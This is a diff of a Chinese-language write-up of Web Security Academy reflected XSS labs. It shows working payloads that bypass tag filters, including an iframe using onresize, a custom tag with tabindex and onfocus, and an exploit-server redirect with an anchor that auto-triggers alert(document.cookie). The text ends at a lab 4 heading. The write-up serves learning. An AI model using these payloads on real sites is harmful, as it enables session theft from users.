@@ -1,8 +1,10 @@
-## 1. Reflected XSS into HTML context with nothing encoded
+[TOC]
+
+#### 1. Reflected XSS into HTML context with nothing encoded
 
 很简单的一道题，有手就行
 
-## 2.Reflected XSS into HTML context with most tags and attributes blocked
+#### 2. Reflected XSS into HTML context with most tags and attributes blocked
 
 题目说过滤了大多数标签，去找找还有什么标签可以使用。
 
@@ -21,3 +23,54 @@ payload:(因为是在body部分，记得提前转码，好像不用转码也能�
 <iframe src="https://ac321fb51e21f4e780230d4600710017.web-security-academy.net/?search=<body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
 ```
 
+#### 3. Reflected XSS into HTML context with all tags blocked except custom ones
+
+* 交互情况
+
+过滤了除过自定义标签之外的所有HTML标签，但可以使用自定义标签。
+
+自定义标签无法使用`onload`属性，但是onfocus可以使用，即聚焦触发（点击，而且可以多次），所以为了聚焦，还得需要给其聚焦的属性--`tabindex`
+
+> **tabindex** [全局属性](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes) 指示其元素是否可以聚焦，以及它是否/在何处参与顺序键盘导航（通常使用Tab键，因此得名）。
+>
+> - tabindex=负值 (通常是tabindex=“-1”)，表示元素是可聚焦的，但是不能通过键盘导航来访问到该元素，用JS做页面小组件内部键盘导航的时候非常有用。
+> - `tabindex="0"` ，表示元素是可聚焦的，并且可以通过键盘导航来聚焦到该元素，它的相对顺序是当前处于的DOM结构来决定的。
+> - tabindex=正值，表示元素是可聚焦的，并且可以通过键盘导航来访问到该元素；它的相对顺序按照**tabindex** 的数值递增而滞后获焦。如果多个元素拥有相同的 **tabindex**，它们的相对顺序按照他们在当前DOM中的先后顺序决定。
+
+`<xss tabindex=1 onfocus="alert(document.cookie)">`
+
+但是聚焦的话，需要一个可以聚焦的对象，所以需要（可显示的）文字
+
+`<xss tabindex=1 onfocus="alert(document.cookie)">aaaaa`
+
+>**补充：经过仔细实测，不用（可显示的）文字也能聚焦触发，即对着前（或后）相应的位置按下即可**
+
+payload:(exploit server)
+
+```html
+<script>
+location = 'https://acbb1f641eaf54af80700c4800db0027.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus="alert(document.cookie)">aaaaa';
+</script>
+```
+
+* 自动触发
+
+自动触发的话，需要用户点击进入页面（exploit server）就自动聚焦，
+
+为了实现自动聚焦，我们给标签添加一个id，然后在后面加上锚点，使用`#`
+
+> <a>标记可以指向具有id属性的任何元素。
+>
+> 打开链接的时候也是同理
+
+`<xss id=x tabindex=1 onfocus="alert(document.cookie)">#x`
+
+最终payload：
+
+```html
+<script>
+location = 'https://acbb1f641eaf54af80700c4800db0027.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus="alert(document.cookie)">#x';
+</script>
+```
+
+#### 4. Reflected XSS with event handlers and `href` attributes blocked
